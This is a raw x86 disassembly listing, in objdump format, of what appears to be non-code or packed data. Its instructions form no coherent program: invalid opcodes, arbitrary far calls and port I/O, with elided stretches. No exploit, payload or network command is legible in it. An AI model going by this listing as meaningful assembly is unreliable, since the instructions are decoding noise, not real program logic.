  42787e:	fldl2e 
  427880:	retf   
  427881:	pop    edx
  427882:	xor    DWORD PTR [eax+eiz*1+0x40001a6],edi
  427889:	add    DWORD PTR [eax],eax
  42788b:	add    dl,ah
  42788d:	fdivr  DWORD PTR [ebx+ebp*4]
  427890:	pop    esi
  427891:	add    DWORD PTR [ebp+0x2b],0xffffffba
  427895:	cli    
  427896:	into   
  427897:	xchg   ecx,eax
  427898:	xor    al,0x9c
  42789a:	jns    0x4278ec
  42789c:	jnp    0x427883
  42789e:	inc    edi
  42789f:	mov    ebx,0xf3c64169
  4278a4:	inc    edi
  4278a5:	pop    ebx
  4278a6:	jle    0x42782b
  4278a8:	mov    ecx,0xd4618c0b
  4278ad:	push   ebx
  4278ae:	inc    eax
  4278af:	mov    eax,0xeb7dfbfc
  4278b4:	sub    BYTE PTR [ecx],dl
  4278b6:	sub    DWORD PTR [edi],0xf8a2cc49
  4278bc:	cmp    bh,BYTE PTR [esi]
  4278be:	ins    BYTE PTR es:[edi],dx
  4278bf:	push   es
  4278c0:	adc    eax,0x5de7f589
  4278c5:	jge    0x4278e0
  4278c7:	mov    cs,WORD PTR [esp+eiz*2]
  4278ca:	aad    0x26
  4278cc:	adc    al,0x88
  4278ce:	pop    es
  4278cf:	adc    DWORD PTR ds:0x2a016095,esi
  4278d5:	dec    eax
  4278d6:	popf   
  4278d7:	push   ecx
  4278d8:	and    cl,BYTE PTR [edi+0x4c]
  4278db:	and    eax,0xa6c6cea7
  4278e0:	mov    eax,0x1c19e21
  4278e5:	adc    eax,0x69383708
  4278ea:	int    0x98
  4278ec:	or     al,0x7d
  4278ee:	rol    DWORD PTR [eax],cl
  4278f0:	jne    0x427943
  4278f2:	add    ebx,ebp
  4278f4:	out    0x79,eax
  4278f6:	clc    
  4278f7:	(bad)  
  4278f8:	xchg   esp,eax
  4278f9:	sub    al,0x9a
  4278fb:	popa   
  4278fc:	pop    eax
  4278fd:	stos   BYTE PTR es:[edi],al
  4278fe:	adc    bh,bh
  427900:	sub    al,0xaf
  427902:	sub    BYTE PTR [ecx+0x20],bh
  427905:	daa    
  427906:	cmp    DWORD PTR [edx-0x78],eax
  427909:	(bad)  
  42790a:	cmc    
  42790b:	mov    ebp,DWORD PTR [ebp+ebp*8-0x7e]
  42790f:	and    edi,DWORD PTR [edx-0x2923238]
  427915:	dec    ebp
  427916:	retf   0x6147
  427919:	aas    
  42791a:	scas   eax,DWORD PTR es:[edi]
  42791b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42791c:	loop   0x42797f
  42791e:	sub    al,0x6
  427920:	fimul  DWORD PTR [ecx+0x6d]
  427923:	imul   eax,DWORD PTR [ecx-0x764a0fb4],0xe5225242
  42792d:	hlt    
  42792e:	ins    BYTE PTR es:[edi],dx
  42792f:	loopne 0x427916
  427931:	xchg   edx,eax
  427932:	lock loopne 0x427969
  427935:	lock inc esp
  427937:	dec    esp
  427938:	pop    esi
  427939:	leave  
  42793a:	mov    esp,0xa9d2225a
  42793f:	repz cdq 
  427941:	add    BYTE PTR [esi],al
  427943:	mov    bh,0x22
  427945:	ret    0x21ce
  427948:	sti    
  427949:	les    eax,FWORD PTR [ebx+0x3]
  42794c:	scas   eax,DWORD PTR es:[edi]
  42794d:	es pushw 0x8b2c
  427952:	dec    edx
  427953:	inc    edx
  427954:	push   esp
  427955:	push   0x3dfa87e4
  42795a:	fiadd  WORD PTR [ecx+eax*8+0x7]
  42795e:	add    dh,BYTE PTR [eax]
  427960:	fdivr  st,st(5)
  427962:	xchg   esp,eax
  427963:	push   ecx
  427964:	cmp    BYTE PTR [esi],dh
  427966:	push   0xf8774d62
  42796b:	(bad)  
  42796c:	cmp    BYTE PTR [edx+0x11],0xde
  427970:	xchg   dh,dl
  427972:	in     al,dx
  427973:	into   
  427974:	push   eax
  427975:	add    ah,BYTE PTR [edi]
  427977:	jbe    0x427929
  427979:	sti    
  42797a:	es inc edx
  42797c:	(bad)  
  42797d:	in     al,dx
  42797e:	inc    esp
  42797f:	push   es
  427980:	jns    0x4279c4
  427982:	test   BYTE PTR [ebp+0x4ae551a],bl
  427988:	call   0x4a9122c2
  42798d:	xor    al,0x39
  42798f:	fld    DWORD PTR [eax]
	...
  4279f1:	add    BYTE PTR [eax],al
  4279f3:	add    BYTE PTR [edx-0x5c0023],bl
  4279f9:	mov    ds:0x7542fdde,eax
  4279fe:	fadd   DWORD PTR [ebx+0x46f788e2]
  427a04:	and    al,0xa7
  427a06:	add    DWORD PTR [eax],eax
  427a08:	add    al,0x1
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	sbb    eax,0x76b135f9
  427a11:	in     al,dx
  427a12:	int    0x2d
  427a14:	pop    eax
  427a15:	aam    0x89
  427a17:	mov    bh,0x66
  427a19:	cli    
  427a1a:	outs   dx,DWORD PTR ds:[esi]
  427a1b:	adc    BYTE PTR [ecx+0x79],dl
  427a1e:	sub    edx,DWORD PTR ds:0xb51cdfee
  427a24:	mov    dl,0xfe
  427a26:	sbb    ah,ah
  427a28:	shr    edi,1
  427a2a:	inc    edx
  427a2b:	por    mm0,mm7
  427a2e:	add    BYTE PTR [eax],cl
  427a30:	mov    esi,DWORD PTR [edi]
  427a32:	mov    al,BYTE PTR [edx-0x2e]
  427a35:	push   ebp
  427a36:	ds xchg ecx,eax
  427a38:	rol    BYTE PTR [edi],cl
  427a3a:	js     0x4279cf
  427a3c:	retf   
  427a3d:	rcl    DWORD PTR [eax-0x15],0x4b
  427a41:	jmp    0xcefd04d9
  427a46:	lea    ecx,[edi+0x5f593270]
  427a4c:	and    DWORD PTR [edx+0x13],0x33
  427a50:	je     0x4279fe
  427a52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a53:	mov    WORD PTR [esi-0x2989ccf3],cs
  427a59:	(bad)  
  427a5a:	outs   dx,DWORD PTR ds:[esi]
  427a5b:	(bad)  
  427a5c:	pop    ecx
  427a5d:	mov    cl,0xa5
  427a5f:	(bad)  
  427a61:	adc    cl,bh
  427a63:	xor    ecx,DWORD PTR [edx+0x24]
  427a66:	cmp    cl,BYTE PTR [ecx+0x5575f544]
  427a6c:	ins    BYTE PTR es:[edi],dx
  427a6d:	addps  xmm2,XMMWORD PTR [ebx+0x24]
  427a71:	pushf  
  427a72:	push   edx
  427a73:	sbb    cl,BYTE PTR [eax-0x37]
  427a76:	fsubr  DWORD PTR [edi+0xc]
  427a79:	inc    eax
  427a7a:	pushf  
  427a7b:	addr16 je 0x427a4f
  427a7e:	adc    ebx,DWORD PTR [edx+eax*2+0x10]
  427a82:	loopne 0x427a97
  427a84:	jnp    0x427ae5
  427a86:	push   edi
  427a87:	pop    ecx
  427a88:	jp     0x427a5e
  427a8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a8b:	in     eax,0xbf
  427a8d:	scas   al,BYTE PTR es:[edi]
  427a8e:	xchg   BYTE PTR [eax+0x41af514e],ah
  427a94:	xor    edx,DWORD PTR [ecx]
  427a96:	adc    BYTE PTR [eax],ch
  427a98:	jno    0x427abf
  427a9a:	enter  0xc4ee,0x84
  427a9e:	in     al,0x9b
  427aa0:	xchg   DWORD PTR [esi+0x7],edi
  427aa3:	mov    esp,0xc2eb2e5a
  427aa8:	scas   al,BYTE PTR es:[edi]
  427aa9:	out    dx,eax
  427aaa:	cmc    
  427aab:	adc    BYTE PTR [esi],bl
  427aad:	cs xchg ebp,eax
  427aaf:	sahf   
  427ab0:	cmp    eax,DWORD PTR [edx-0x45]
  427ab3:	pop    eax
  427ab4:	ret    0x674d
  427ab7:	sub    eax,0x285815a5
  427abc:	stc    
  427abd:	dec    ebx
  427abe:	dec    edi
  427ac0:	pushf  
  427ac1:	xor    edx,DWORD PTR [edi+0x439fe075]
  427ac7:	aaa    
  427ac8:	jecxz  0x427b3e
  427aca:	fdivr  st(5),st
  427acc:	dec    ebp
  427acd:	nop
  427ace:	mov    ah,0x78
  427ad0:	sbb    dl,BYTE PTR [eax]
  427ad2:	(bad)  
  427ad3:	pop    esp
  427ad4:	dec    edx
  427ad5:	(bad)  
  427ad7:	jmp    0xcfd7307c
  427adc:	cmp    DWORD PTR [ebx],0xffffff82
  427adf:	fs in  eax,dx
  427ae1:	loop   0x427b01
  427ae3:	mov    bl,0xf4
  427ae5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ae6:	int    0x25
  427ae8:	ss test al,bl
  427aeb:	sub    dh,0x6e
  427aee:	xchg   edx,edi
  427af0:	ja     0x427b3b
  427af2:	xchg   esi,eax
  427af3:	sub    ebp,edx
  427af5:	dec    ebp
  427af6:	bnd call 0x6fc0ec5e
  427afc:	push   edx
  427afd:	fdivr  st(4),st
  427aff:	call   0x4e5d5d98
  427b04:	or     DWORD PTR [edi+edx*1],esi
  427b07:	mov    ah,0x76
  427b09:	mov    BYTE PTR [edi+0x28],al
  427b0c:	mov    BYTE PTR [ebx+0x5b],ah
  427b0f:	xchg   edx,eax
	...
  427b74:	retf   0x528b
  427b77:	jnp    0x427bcc
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	imul   BYTE PTR [ebp+0x28fcbed0]
  427b85:	test   al,0x1
  427b87:	add    BYTE PTR [ecx+eax*1],al
  427b8a:	add    BYTE PTR [eax],al
  427b8c:	push   cs
  427b8d:	loop   0x427be3
  427b8f:	dec    esi
  427b90:	out    0x17,eax
  427b92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b93:	popa   
  427b94:	dec    ebx
  427b95:	ins    BYTE PTR es:[edi],dx
  427b96:	jge    0x427b84
  427b98:	jmp    0xd33c:0x617f0ace
  427b9f:	inc    ebp
  427ba0:	sub    eax,0x705eee2
  427ba5:	rol    BYTE PTR [esi+0x461bfa08],1
  427bab:	push   eax
  427bac:	ins    DWORD PTR es:[edi],dx
  427bad:	mov    ebp,0xf5674dad
  427bb2:	out    0x1e,eax
  427bb4:	jle    0x427ba3
  427bb6:	inc    eax
  427bb7:	xor    DWORD PTR [esi],edi
  427bb9:	sbb    ch,ch
  427bbb:	lahf   
  427bbc:	(bad)  
  427bbd:	mov    eax,ds:0xe1b2b5f7
  427bc2:	or     al,0xb3
  427bc4:	xor    al,0xb
  427bc6:	xchg   ebx,eax
  427bc7:	sar    DWORD PTR [edx+edx*8],0x5e
  427bcb:	retf   
  427bcc:	das    
  427bcd:	fnstenv [ecx]
  427bcf:	inc    eax
  427bd0:	jg     0x427c18
  427bd2:	mov    edi,0xc3f59fc5
  427bd7:	xor    BYTE PTR [ecx-0x65],al
  427bda:	and    esp,DWORD PTR [edi]
  427bdc:	mov    cs,WORD PTR [eax+0x5a]
  427bdf:	xchg   BYTE PTR ds:0x8c7ffdd6,ah
  427be5:	int    0x9c
  427be7:	mov    DWORD PTR [ebp+0x3b],esp
  427bea:	outs   dx,BYTE PTR ds:[esi]
  427beb:	scas   al,BYTE PTR es:[edi]
  427bec:	repz gs sbb ah,dl
  427bf0:	sub    esi,DWORD PTR [ecx]
  427bf2:	or     DWORD PTR [eax],0xbb4d1381
  427bf8:	sub    BYTE PTR [edx],0x10
  427bfb:	test   eax,0x47184b2f
  427c00:	add    ch,BYTE PTR [eax+0x4c]
  427c03:	lods   eax,DWORD PTR ds:[esi]
  427c04:	or     ah,al
  427c06:	dec    edi
  427c07:	mov    dh,0x1d
  427c09:	push   ebp
  427c0a:	jp     0x427c67
  427c0c:	pop    DWORD PTR [ecx-0x53f7b89f]
  427c12:	sbb    edx,ebp
  427c14:	leave  
  427c15:	(bad)  
  427c16:	test   BYTE PTR [ecx+edx*2],0x91
  427c1a:	dec    esp
  427c1b:	dec    esi
  427c1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c1d:	adc    eax,0x5ea634e8
  427c22:	mov    al,0x30
  427c24:	jo     0x427c88
  427c26:	adc    eax,edi
  427c28:	jmp    0x1a506549
  427c2d:	push   ebx
  427c2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c2f:	sub    BYTE PTR [edx-0x7738b1f3],0x77
  427c36:	pop    ds
  427c37:	fdivr  DWORD PTR [ebx]
  427c39:	mov    BYTE PTR [edi],dl
  427c3b:	(bad)  
  427c3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c3d:	dec    ebp
  427c3e:	pop    edx
  427c3f:	or     al,0xeb
  427c41:	cmp    eax,ebp
  427c43:	mov    ch,0x5d
  427c45:	scas   eax,DWORD PTR es:[edi]
  427c46:	push   esi
  427c47:	push   es
  427c48:	pusha  
  427c49:	sub    esp,DWORD PTR [ebx]
  427c4b:	jne    0x427bea
  427c4d:	lds    ecx,FWORD PTR [edx]
  427c4f:	or     eax,0x49aba555
  427c54:	rcr    ecx,cl
  427c56:	add    BYTE PTR [edx-0x7d],ah
  427c59:	sbb    BYTE PTR [ebx+eiz*4],ah
  427c5c:	lea    eax,[ecx+0x77]
  427c5f:	enter  0x595d,0xd8
  427c63:	xchg   ebx,eax
  427c64:	jb     0x427c5c
  427c66:	cwde   
  427c67:	inc    ebx
  427c68:	and    edx,DWORD PTR [edx+0x20]
  427c6b:	jmp    DWORD PTR [ebx]
  427c6d:	lahf   
  427c6e:	fld1   
  427c70:	cmp    al,0xa7
  427c72:	xchg   edi,eax
  427c73:	push   cs
  427c74:	inc    esp
  427c75:	mov    ebp,0xc1aaaec6
  427c7a:	test   DWORD PTR [edi+0x6e],edx
  427c7d:	lahf   
  427c7e:	mov    ebx,0xd94a1955
  427c83:	das    
  427c84:	mov    ds:0x6fe29d13,al
  427c89:	mov    cl,0x12
  427c8b:	mov    edi,0x7a6d0cb4
	...
  427cf4:	mov    ds:0xf343b050,eax
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0x37695d44,ebx
  427d02:	jns    0x427cb5
  427d04:	sub    al,0xa9
  427d06:	add    DWORD PTR [eax],eax
  427d08:	add    al,0x1
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	int    0x63
  427d0e:	cmp    BYTE PTR [ecx],bl
  427d10:	mov    esi,0x6f4b8692
  427d15:	cmp    al,0x7d
  427d17:	or     al,0xa1
  427d19:	push   esi
  427d1a:	mov    dh,0x2f
  427d1c:	test   edx,ebx
  427d1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d1f:	xlat   BYTE PTR ds:[ebx]
  427d20:	cdq    
  427d21:	jns    0x427d17
  427d23:	push   ebp
  427d24:	cli    
  427d25:	test   BYTE PTR [ecx+0x2c],cl
  427d28:	push   es
  427d29:	sub    BYTE PTR [eax-0x55dcb44f],cl
  427d2f:	and    DWORD PTR [ebx+0x71203673],0x3d
  427d36:	push   0xffffffb4
  427d38:	sti    
  427d39:	sahf   
  427d3a:	and    eax,0xbd19b7b2
  427d3f:	pop    ebp
  427d40:	cmp    al,dh
  427d42:	mov    ds,WORD PTR [eax+0x1da099d7]
  427d48:	std    
  427d49:	or     al,0x89
  427d4b:	sub    ah,BYTE PTR [ebx]
  427d4d:	iret   
  427d4e:	out    dx,al
  427d4f:	xor    DWORD PTR [edx+0x4],esi
  427d52:	stos   BYTE PTR es:[edi],al
  427d53:	and    DWORD PTR [eax],edi
  427d55:	sbb    ebx,DWORD PTR [ebp-0x503da68b]
  427d5b:	repnz rol DWORD PTR [ebx],1
  427d5e:	sbb    DWORD PTR [edx-0x574256ce],0x6748796e
  427d68:	xor    DWORD PTR [esi],ebp
  427d6a:	or     ebx,ebx
  427d6c:	scas   eax,DWORD PTR es:[edi]
  427d6d:	retf   0x64cb
  427d70:	inc    esi
  427d71:	mov    ah,0xf7
  427d73:	iret   
  427d74:	mov    ecx,0x3b65fe14
  427d79:	adc    ah,BYTE PTR [esi-0x3]
  427d7c:	imul   ecx,ebp,0x392014ef
  427d82:	mov    esi,0x4c192516
  427d87:	mov    esi,0xcde51f47
  427d8c:	mov    bh,0xf2
  427d8e:	pop    esi
  427d8f:	jecxz  0x427ddf
  427d91:	cmp    dl,BYTE PTR [edx+0x50007c88]
  427d97:	test   eax,0x3cad4e4d
  427d9c:	mov    cl,BYTE PTR [edi+0x26]
  427d9f:	xor    BYTE PTR [ecx],0x66
  427da2:	pop    edi
  427da3:	ins    DWORD PTR es:[edi],dx
  427da4:	mov    al,0xf4
  427da6:	inc    esi
  427da7:	js     0x427dd4
  427da9:	ins    DWORD PTR es:[edi],dx
  427daa:	lock imul BYTE PTR [esi+0x67]
  427dae:	or     bh,BYTE PTR [ecx-0x1c]
  427db1:	es pop es
  427db3:	mov    ecx,0x6d5794b4
  427db8:	repz mov ds:0x66337a99,eax
  427dbe:	adc    ch,BYTE PTR [edx-0x27df280c]
  427dc4:	outs   dx,DWORD PTR ds:[esi]
  427dc5:	lahf   
  427dc6:	xor    ebx,ecx
  427dc8:	push   0x7c764ba8
  427dcd:	mov    ebx,esp
  427dcf:	loop   0x427de3
  427dd1:	xor    ah,BYTE PTR [edx+0x5b6841de]
  427dd7:	xchg   esi,eax
  427dd8:	ret    0x5961
  427ddb:	cdq    
  427ddc:	mov    eax,0xd530c4bf
  427de1:	mov    edi,0x3f3c4a6f
  427de6:	push   ecx
  427de7:	in     al,0x56
  427de9:	(bad)  
  427dea:	jmp    0x822979c
  427def:	ins    DWORD PTR es:[edi],dx
  427df0:	ror    bh,cl
  427df2:	xor    eax,0x5803a433
  427df7:	enter  0xe1d,0xf2
  427dfb:	mov    esi,0x5b7c97f7
  427e00:	sub    BYTE PTR [ecx+0x2],0x45
  427e04:	or     eax,0xf51fd083
  427e09:	pop    ebp
  427e0a:	js     0x427dcf
  427e0c:	into   
  427e0d:	loop   0x427e72
  427e0f:	scas   al,BYTE PTR es:[edi]
	...
  427e74:	mov    eax,0x6d3c25f1
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	shl    BYTE PTR [ecx],1
  427e82:	retf   
  427e83:	aad    0x30
  427e85:	stos   BYTE PTR es:[edi],al
  427e86:	add    DWORD PTR [eax],eax
  427e88:	add    al,0x1
  427e8a:	add    BYTE PTR [eax],al
  427e8c:	adc    eax,0x464f63fb
  427e91:	mov    edi,0xd45000da
  427e96:	pop    ebx
  427e97:	mov    ds:0xd83c88b5,al
  427e9c:	(bad)  
  427e9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e9e:	popa   
  427e9f:	call   0x58c5a269
  427ea4:	jno    0x427f08
  427ea6:	adc    ah,bh
  427ea8:	or     al,0xf
  427eaa:	sub    bh,BYTE PTR [esi+eax*4-0x6e]
  427eae:	or     DWORD PTR [edx-0x79c0c649],ebp
  427eb4:	dec    esp
  427eb5:	lods   al,BYTE PTR ds:[esi]
  427eb6:	inc    ecx
  427eb7:	dec    ebx
  427eb8:	xor    cl,al
  427eba:	jae    0x427e84
  427ebc:	icebp  
  427ebd:	adc    ah,bl
  427ebf:	and    al,0xa0
  427ec1:	sbb    al,0x2d
  427ec3:	jae    0x427e55
  427ec5:	sub    BYTE PTR [edi+ebp*2-0x74],bl
  427ec9:	enter  0x88fa,0x87
  427ecd:	adc    eax,ecx
  427ecf:	mov    ah,0xd2
  427ed1:	add    dl,BYTE PTR [ebx+0x64]
  427ed4:	push   es
  427ed5:	outs   dx,DWORD PTR ds:[esi]
  427ed6:	jno    0x427f07
  427ed8:	outs   dx,DWORD PTR ds:[esi]
  427ed9:	push   cs
  427eda:	xchg   ecx,eax
  427edb:	les    ecx,FWORD PTR [ebx]
  427edd:	sar    DWORD PTR [ebx],1
  427edf:	scas   eax,DWORD PTR es:[edi]
  427ee0:	out    dx,al
  427ee1:	jbe    0x427f44
  427ee3:	dec    ecx
  427ee4:	dec    edi
  427ee5:	mov    esi,0x1dba8aa5
  427eea:	mov    ds:0x2478853f,al
  427eef:	pop    ecx
  427ef0:	loop   0x427f3a
  427ef2:	xchg   edx,eax
  427ef3:	lahf   
  427ef4:	and    ebp,DWORD PTR [edi-0x493896c3]
  427efa:	mul    cl
  427efc:	div    DWORD PTR ds:0x467138b6
  427f02:	das    
  427f03:	push   cs
  427f04:	inc    ebp
  427f05:	add    BYTE PTR [edx+ebp*1],0xd8
  427f09:	mov    dh,0xa9
  427f0b:	repz bound ebx,QWORD PTR [edi]
  427f0e:	lods   eax,DWORD PTR ds:[esi]
  427f0f:	sahf   
  427f10:	adc    eax,0xac1cba10
  427f15:	dec    edi
  427f16:	iret   
  427f17:	and    BYTE PTR [ecx],ch
  427f19:	dec    ebx
  427f1a:	or     dh,dl
  427f1c:	xor    eax,0x9a84abef
  427f21:	and    cl,BYTE PTR [edx+0x1b57b894]
  427f27:	ret    0x8d64
  427f2a:	not    DWORD PTR [edx+ebp*4]
  427f2d:	lods   eax,DWORD PTR ds:[esi]
  427f2e:	test   edi,0x1581baae
  427f34:	mov    ebp,0x64a32ea4
  427f39:	ror    ecx,1
  427f3b:	jle    0x427f42
  427f3d:	adc    dh,ch
  427f3f:	dec    ebx
  427f40:	out    0xf,eax
  427f42:	test   al,0xb9
  427f44:	xlat   BYTE PTR ds:[ebx]
  427f45:	test   eax,0x99a7eb5c
  427f4a:	dec    esp
  427f4b:	cmp    BYTE PTR [edx-0x23658502],dh
  427f51:	pop    ebx
  427f52:	mov    BYTE PTR [edx-0x6bee50ec],cl
  427f58:	cmp    eax,0x7511e96d
  427f5d:	div    dh
  427f5f:	rcl    DWORD PTR [edi+edi*4],1
  427f62:	mov    eax,ds:0x8f5c3b53
  427f67:	push   edi
  427f68:	jno    0x427f6b
  427f6a:	sti    
  427f6b:	jecxz  0x427f0f
  427f6d:	or     eax,0xdce21cd6
  427f72:	(bad)  
  427f73:	mov    al,0xc6
  427f75:	(bad)  
  427f77:	push   ds
  427f78:	mov    edx,0xd3ea9fd2
  427f7d:	xchg   ecx,eax
  427f7e:	dec    ebp
  427f7f:	pop    esi
  427f80:	or     dl,al
  427f82:	dec    edi
  427f83:	cmc    
  427f84:	shr    BYTE PTR [esi-0x1c],1
  427f87:	loope  0x427f9a
  427f89:	inc    edi
  427f8a:	popf   
  427f8b:	jle    0x427fbc
  427f8d:	bswap  edx
  427f8f:	or     eax,0x0
	...
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	call   0x1ab:0x342bce44
  428007:	add    BYTE PTR [ecx+eax*1],al
  42800a:	add    BYTE PTR [eax],al
  42800c:	fdiv   QWORD PTR [ebp+ebp*4+0x168d3a10]
  428013:	inc    edi
  428014:	ja     0x428016
  428016:	ret    0x6be3
  428019:	ds xchg ebx,eax
  42801b:	push   cs
  42801c:	ret    
  42801d:	sahf   
  42801e:	fistp  DWORD PTR [ecx]
  428020:	or     dh,BYTE PTR [edi]
  428022:	jne    0x42807e
  428024:	gs loopne 0x42805c
  428027:	ror    edx,1
  428029:	bound  edx,QWORD PTR [edx]
  42802b:	repz sbb edi,DWORD PTR [ebx+0x425c64db]
  428032:	cld    
  428033:	test   eax,0xfa7ad55b
  428038:	or     DWORD PTR [esi+0x14],0x3
  42803c:	push   edi
  42803d:	les    eax,FWORD PTR [edi+0x68]
  428040:	outs   dx,DWORD PTR ds:[esi]
  428041:	ror    DWORD PTR [esi],1
  428043:	jo     0x42800e
  428045:	mov    esi,0xc0d3c00
  42804a:	push   esi
  42804b:	dec    edx
  42804c:	push   ds
  42804d:	les    esi,FWORD PTR [edx+0x17648c2f]
  428053:	jnp    0x427fdb
  428055:	imul   ecx,DWORD PTR [edx+0x58],0xd930103e
  42805c:	mov    edi,0x79e2dc1c
  428061:	mov    eax,ds:0x6c4eb150
  428066:	fld    TBYTE PTR [esi-0x69]
  428069:	dec    ebx
  42806a:	bnd jg 0x42802d
  42806d:	sbb    esi,esi
  42806f:	push   es
  428070:	call   0x2c50:0x91cea8d7
  428077:	aaa    
  428078:	call   0x44a1:0x8da60bdd
  42807f:	aam    0x36
  428081:	mov    WORD PTR [ecx+0x60],ds
  428084:	dec    ebp
  428085:	and    ebx,DWORD PTR [esi+ecx*1+0x73d0fd71]
  42808c:	push   ecx
  42808d:	enter  0x48ec,0xdc
  428091:	int    0x7c
  428093:	ret    0xd195
  428096:	out    dx,al
  428097:	cmc    
  428098:	mov    ebx,0x916de10
  42809d:	sbb    cl,BYTE PTR [edx+0x2a]
  4280a0:	std    
  4280a1:	dec    edi
  4280a2:	jne    0x428120
  4280a4:	test   al,0x40
  4280a6:	mov    esp,0x4d08914
  4280ab:	daa    
  4280ac:	hlt    
  4280ad:	pop    es
  4280ae:	xchg   BYTE PTR [esp+eax*1+0x1c239c7f],cl
  4280b5:	imul   eax,DWORD PTR [edi-0x230f2fee],0xdf11518b
  4280bf:	xchg   esi,eax
  4280c0:	xchg   edi,eax
  4280c1:	cmc    
  4280c2:	lock or BYTE PTR [bx+di+0x3a],ah
  4280c7:	inc    esi
  4280c8:	xor    BYTE PTR [esi],bl
  4280ca:	loope  0x42808a
  4280cc:	jmp    0xd94ca10f
  4280d1:	xor    al,0x58
  4280d3:	pop    eax
  4280d4:	inc    ebx
  4280d5:	adc    al,0x75
  4280d7:	lea    edx,[ebx]
  4280d9:	pop    edx
  4280da:	adc    dh,ch
  4280dc:	pop    es
  4280dd:	add    eax,0x907073cf
  4280e2:	dec    ecx
  4280e3:	sub    eax,esp
  4280e5:	adc    al,0x6a
  4280e7:	test   eax,0x5dbcd0c2
  4280ec:	xchg   edi,eax
  4280ed:	mov    bl,0x80
  4280ef:	nop
  4280f0:	(bad)  
  4280f1:	adc    eax,0xc9edecbe
  4280f6:	and    dl,cl
  4280f8:	scas   al,BYTE PTR es:[edi]
  4280f9:	int3   
  4280fa:	cmp    esp,edi
  4280fc:	scas   al,BYTE PTR es:[edi]
  4280fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280fe:	cwde   
  4280ff:	data16 jno 0x428113
  428102:	clc    
  428103:	sbb    eax,eax
  428105:	or     bl,BYTE PTR [esi+edi*1+0x64]
  428109:	mov    ebx,DWORD PTR [eax]
  42810b:	jno    0x428159
  42810d:	fwait
  42810e:	cmp    ah,dh
	...
  428174:	fucomip st,st(6)
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	lock scas eax,DWORD PTR es:[edi]
  428182:	mul    BYTE PTR [eax]
  428184:	cmp    BYTE PTR [ecx+eax*1+0x10400],ch
  42818b:	add    BYTE PTR ds:0x8cfbda02,dl
  428191:	jmp    0x42815f
  428193:	(bad)  
  428194:	mov    ebx,0xa239b8da
  428199:	xor    edi,DWORD PTR [ecx]
  42819b:	mov    cl,0x1c
  42819d:	xchg   ebx,eax
  42819e:	sbb    esi,ebx
  4281a0:	sbb    al,0x38
  4281a2:	jecxz  0x428143
  4281a4:	ficomp DWORD PTR [ecx+0x13]
  4281a7:	popf   
  4281a8:	test   DWORD PTR [esi],esp
  4281aa:	ja     0x4281f5
  4281ac:	lock int 0xb1
  4281af:	mov    ds:0xfc41e53b,al
  4281b4:	cmp    DWORD PTR [ecx],esp
  4281b6:	std    
  4281b7:	adc    BYTE PTR [edx-0x153e92e6],0x36
  4281be:	and    esp,DWORD PTR ds:0x6df002aa
  4281c4:	and    eax,0x90e9a65a
  4281c9:	nop
  4281ca:	sub    BYTE PTR [esi],bh
  4281cc:	dec    edx
  4281cd:	leave  
  4281ce:	cmp    eax,0x89cde877
  4281d3:	fiadd  WORD PTR [esi]
  4281d5:	xchg   ebp,esi
  4281d7:	mov    ebp,0xbc318d16
  4281dc:	stos   BYTE PTR es:[edi],al
  4281dd:	cmp    eax,0xd78a73cb
  4281e2:	pop    ebx
  4281e3:	push   esi
  4281e4:	cmp    al,BYTE PTR [edx+0xfbbcda3]
  4281ea:	push   ss
  4281eb:	dec    eax
  4281ec:	or     al,0x6f
  4281ee:	jns    0x42822e
  4281f0:	inc    ecx
  4281f1:	arpl   si,si
  4281f3:	sub    ah,ah
  4281f5:	and    DWORD PTR [ebp+0x73],ecx
  4281f8:	lea    esi,[eax]
  4281fa:	jb     0x42821c
  4281fc:	inc    ecx
  4281fd:	cli    
  4281fe:	mov    eax,ds:0xaac6d7ba
  428203:	imul   ebx,ecx,0xffffffef
  428206:	adc    al,0x52
  428208:	add    DWORD PTR [ebp-0x76],0x11ea505b
  42820f:	call   0x5d3e46a0
  428214:	xchg   ecx,eax
  428215:	stos   DWORD PTR es:[edi],eax
  428216:	and    dh,cl
  428218:	loopne 0x42828e
  42821a:	setl   BYTE PTR [edx+esi*8+0x5bfb092]
  428222:	mov    cl,0xc1
  428224:	xchg   esp,eax
  428225:	mov    al,0xb3
  428227:	adc    cl,dl
  428229:	sub    bh,BYTE PTR [edx+ecx*2-0x1143230b]
  428230:	ficom  WORD PTR [edx-0x53d0e0b]
  428236:	stos   DWORD PTR es:[edi],eax
  428237:	repnz xchg esp,eax
  428239:	dec    edi
  42823a:	mov    edi,0x6b00e0b9
  42823f:	push   ecx
  428240:	loopne 0x428262
  428242:	sbb    ecx,DWORD PTR [ebp+0x5e]
  428245:	push   ebp
  428246:	loopne 0x42825b
  428248:	jb     0x428211
  42824a:	mov    ?,WORD PTR [ebx]
  42824c:	scas   eax,DWORD PTR es:[edi]
  42824d:	pop    ecx
  42824e:	shl    DWORD PTR [ebp+0x36],1
  428251:	aam    0x10
  428253:	mov    al,ds:0xcae80c34
  428258:	cmp    ecx,DWORD PTR [ebx+0x28]
  42825b:	mov    eax,0x167c2c79
  428260:	call   0xb8e1:0x5fa852ed
